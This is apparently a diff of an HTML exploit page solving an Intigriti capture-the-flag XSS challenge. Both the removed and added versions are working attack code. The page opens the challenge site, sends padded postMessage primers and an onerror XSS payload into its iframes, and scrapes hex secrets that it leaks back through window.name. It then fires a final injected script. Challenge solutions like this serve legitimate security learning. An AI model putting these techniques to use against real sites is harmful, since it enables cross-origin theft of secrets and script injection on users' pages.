@@ -1,133 +1,125 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti Exploit v2</title>
+    <title>Intigriti Debug Exploit</title>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: #0f0; padding: 20px; }
+        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
+        td, th { border: 1px solid #333; padding: 8px; text-align: left; }
+        .found { background: #004400; color: #fff; }
+        .missing { background: #440000; color: #ffcccc; }
+    </style>
 </head>
 <body>
-    <h1>Protocol v2: The Name Channel</h1>
-    <p>Click Launch. Do not close the new tab.</p>
-    <button id="btn" style="font-size:20px; padding:20px; background:blue; color:white;">LAUNCH EXPLOIT</button>
-    <h3>Stones Collected:</h3>
-    <div id="status">Waiting...</div>
-    <pre id="log" style="background:#f0f0f0; padding:10px;"></pre>
+    <h1>Protocol v3: Visual Debugger</h1>
+    <p>Click Launch. Wait 3 seconds. Check the table below.</p>
+    <button id="btn" style="font-size:20px; padding:15px; background:#0f0; color:black; border:none; cursor:pointer;">LAUNCH EXPLOIT</button>
+    
+    <h3>Infinity Gauntlet Status:</h3>
+    <table id="stoneTable">
+        <tr><th>Index</th><th>Stone</th><th>Status</th><th>Secret</th></tr>
+        <tr id="row-0"><td class="missing">0</td><td>Power</td><td>Waiting...</td><td>-</td></tr>
+        <tr id="row-1"><td class="missing">1</td><td>Reality</td><td>Waiting...</td><td>-</td></tr>
+        <tr id="row-2"><td class="missing">2</td><td>Soul</td><td>Waiting...</td><td>-</td></tr>
+        <tr id="row-3"><td class="missing">3</td><td>Space</td><td>Waiting...</td><td>-</td></tr>
+        <tr id="row-4"><td class="missing">4</td><td>Time</td><td>Waiting...</td><td>-</td></tr>
+        <tr id="row-5"><td class="missing">5</td><td>Mind</td><td>Waiting...</td><td>-</td></tr>
+    </table>
+
+    <pre id="log" style="background:#333; padding:10px; margin-top:20px;"></pre>
 
     <script>
         let targetWin = null;
-        let stones = {}; // Store found secrets
-        let attackTimer = null;
-
-        document.getElementById('btn').addEventListener('click', () => {
-            // 1. Open the target
-            targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
-            log("Target launched. Engaging...");
-
-            // 2. Start the aggressive attack loop (Run every 200ms)
-            // We must race against the 3-second timer.
-            attackTimer = setInterval(attackAndCollect, 200);
-        });
-
-        function attackAndCollect() {
-            if(!targetWin) return;
-            
-            // We loop through all 6 potential iframes
-            for (let i = 0; i < 6; i++) {
-                // If we already have this stone, skip attacking it
-                if (stones[i]) continue;
-
-                try {
-                    // A. ATTACK: Send the exploit to the iframe
-                    // We can access the window object targetWin[i] even cross-origin
-                    let frame = targetWin[i];
-                    if (!frame) continue;
-
-                    // Step 1: Primer (2000 chars padding)
-                    frame.postMessage("A".repeat(2000) + "<", '*');
-
-                    // Step 2: Payload
-                    // This script runs INSIDE the stone. 
-                    // CRITICAL CHANGE: We set 'window.name' instead of using postMessage back.
-                    const extractor = `
-                        var secret = "";
-                        // Method 1: URL Search
-                        var match = location.search.match(/=[a-f0-9]{8}/);
-                        if(match) secret = match[0].substring(1);
-                        
-                        // Method 2: Space Stone Listener (It gets code via postMessage)
-                        // We attach a listener to catch the parent's message
-                        window.addEventListener('message', e => {
-                            if(e.data && e.data.length === 8) {
-                                window.name = e.data; // Set the name immediately
-                            }
-                        });
-
-                        // Method 3: DOM Scrape (Fallback)
-                        if(!secret) {
-                            var body = document.body.innerText;
-                            var hex = body.match(/[a-f0-9]{8}/);
-                            if(hex) secret = hex[0];
-                        }
-
-                        // EXFILTRATE via window.name
-                        if(secret) window.name = secret;
-                    `;
-                    
-                    frame.postMessage(`<img src=x onerror="${extractor}">`, '*');
-
-                    // B. COLLECT: Attempt to read the stone's window.name
-                    // Cross-origin reading of .name is allowed!
-                    let stolenSecret = frame.name;
-                    
-                    // Check if it looks like a valid secret (8 chars, hex-ish)
-                    if (stolenSecret && stolenSecret.length === 8 && !stolenSecret.includes(' ')) {
-                        stones[i] = stolenSecret;
-                        log(`[+] GOT STONE ${i}: ${stolenSecret}`);
-                        updateStatus();
-                    }
-
-                } catch(e) { 
-                    // Ignore cross-origin errors during loading
-                }
-            }
-
-            // Check if we won
-            if (Object.keys(stones).length >= 6) {
-                finishHim();
-            }
-        }
-
-        function finishHim() {
-            clearInterval(attackTimer);
-            log("ALL STONES ACQUIRED. ASSEMBLING GAUNTLET...");
-
-            // Order: Power(0) + Mind(5) + Reality(1) + Space(3) + Soul(2) + Time(4)
-            // Note: Indices based on your screenshot/code analysis
-            const fullCode = 
-                (stones[0] || "MISSING") + 
-                (stones[5] || "MISSING") + 
-                (stones[1] || "MISSING") + 
-                (stones[3] || "MISSING") + 
-                (stones[2] || "MISSING") + 
-                (stones[4] || "MISSING");
-
-            log("CODE: " + fullCode);
-            
-            // EXECUTE
-            // We use the Main Window directly.
-            // The listener on the main page is: window.addEventListener('message', ...)
-            // It survives the 'bye.jpeg' wipe because it's on the window object.
-            const payload = fullCode + "alert(document.domain)";
-            targetWin.postMessage(payload, '*');
-            
-            log("Sent Final Payload. Check the other tab!");
-        }
-
-        function updateStatus() {
-            document.getElementById('status').innerText = 
-                `Stones: ${Object.keys(stones).length} / 6`;
-        }
+        let stones = {};
+        let attackInterval = null;
 
         function log(msg) {
             document.getElementById('log').innerText = msg + "\n" + document.getElementById('log').innerText;
+        }
+
+        function updateTable(index, secret) {
+            const row = document.getElementById(`row-${index}`);
+            row.className = "found";
+            row.cells[2].innerText = "CAPTURED";
+            row.cells[3].innerText = secret;
+        }
+
+        document.getElementById('btn').addEventListener('click', () => {
+            targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
+            log("Target launched. Starting Rapid Fire...");
+            // Attack very fast (100ms) to catch the window before it closes
+            attackInterval = setInterval(attack, 100);
+        });
+
+        function attack() {
+            if(!targetWin) return;
+
+            // Attack all 6 frames
+            for (let i = 0; i < 6; i++) {
+                if (stones[i]) continue; // Skip if caught
+
+                try {
+                    let frame = targetWin[i];
+                    if (!frame) continue;
+
+                    // 1. PRIMER (Large padding)
+                    frame.postMessage("A".repeat(2500) + "<", '*');
+
+                    // 2. PAYLOAD (Improved Scraper)
+                    // We check URL, then Body (for Space), then Title.
+                    // We exfiltrate via window.name
+                    const code = `
+                        var s = "";
+                        // A. URL (Power, Reality, Soul, Mind, Time?)
+                        var m = location.search.match(/=[a-f0-9]{8}/);
+                        if(m) s = m[0].substring(1);
+
+                        // B. Body Text (Space Stone - Critical Fix)
+                        if(!s) {
+                            var body = document.body.innerText || "";
+                            var hex = body.match(/[a-f0-9]{8}/);
+                            if(hex) s = hex[0];
+                        }
+                        
+                        // C. Exfiltrate
+                        if(s) window.name = "STONE:" + ${i} + ":" + s;
+                    `;
+                    
+                    frame.postMessage(`<img src=x onerror='${code}'>`, '*');
+
+                    // 3. COLLECT
+                    // Read the window.name property
+                    let data = frame.name;
+                    if (data && data.startsWith("STONE:")) {
+                        let parts = data.split(":");
+                        let idx = parseInt(parts[1]);
+                        let secret = parts[2];
+                        
+                        if (!stones[idx]) {
+                            stones[idx] = secret;
+                            updateTable(idx, secret);
+                            log(`[+] Got Stone ${idx}: ${secret}`);
+                            checkWin();
+                        }
+                    }
+                } catch(e) {}
+            }
+        }
+
+        function checkWin() {
+            // Even if we miss Time Stone, if we have others, let's try to infer or alert.
+            // If we have all 6:
+            if (Object.keys(stones).length >= 6) {
+                clearInterval(attackInterval);
+                log("ALL STONES FOUND. EXECUTING...");
+                
+                // Construct Code
+                // Order: Power(0)+Mind(5)+Reality(1)+Space(3)+Soul(2)+Time(4)
+                const fullCode = stones[0]+stones[5]+stones[1]+stones[3]+stones[2]+stones[4];
+                
+                // Final Attack via Main Window
+                targetWin.postMessage(fullCode + "alert(document.domain)", '*');
+            }
         }
     </script>
 </body>
